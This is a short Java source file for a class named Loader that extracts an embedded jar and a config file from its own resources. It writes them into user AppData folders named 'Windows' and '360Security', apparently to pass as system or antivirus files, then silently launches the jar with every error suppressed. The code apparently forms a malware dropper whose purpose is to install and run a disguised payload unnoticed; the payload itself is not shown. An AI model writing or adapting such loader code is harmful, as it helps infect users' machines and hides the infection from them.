import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class Loader {
   public static InputStream data = Loader.class.getResourceAsStream("resources/Data.cfg");
   public static InputStream jar = Loader.class.getResourceAsStream("resources/java.jar");
    public static void main(String[] args) {
        try {
            File file = new File(getPath() + "\\javaw.jar");
            if(!file.exists()) {
                createConfig();
                createFile(file);
                createProcess();
            }else {
                System.exit(0);
            }
        }catch (Exception e) {
        }
    }
    public static void createProcess() {
        try {
            Runtime.getRuntime().exec("java -jar " + getPath() + "\\" + "javaw.jar");
        }catch (Exception e) {
        }
    }
    public static void createFile(File file) {
        try {
            file.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            byte[] bytes = new byte[1024];
            int len = 0;
            while ((len = jar.read(bytes))!=-1) {
                fileOutputStream.write(bytes,0,len);
            }
        }catch (Exception e) {
        }
    }
    public static void createConfig() {
        try {
            File file = new File(getPath1() + "\\360Security.ini");
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            int len = 0;
            byte[] bytes = new byte[256];
            while ((len = data.read(bytes))!=-1) {
                fileOutputStream.write(bytes,0,len);
            }
            fileOutputStream.close();
        }catch (Exception e) {
        }
    }
    public static String getPath1() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" +"\\360Security");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
    public static String getPath() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Windows");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
}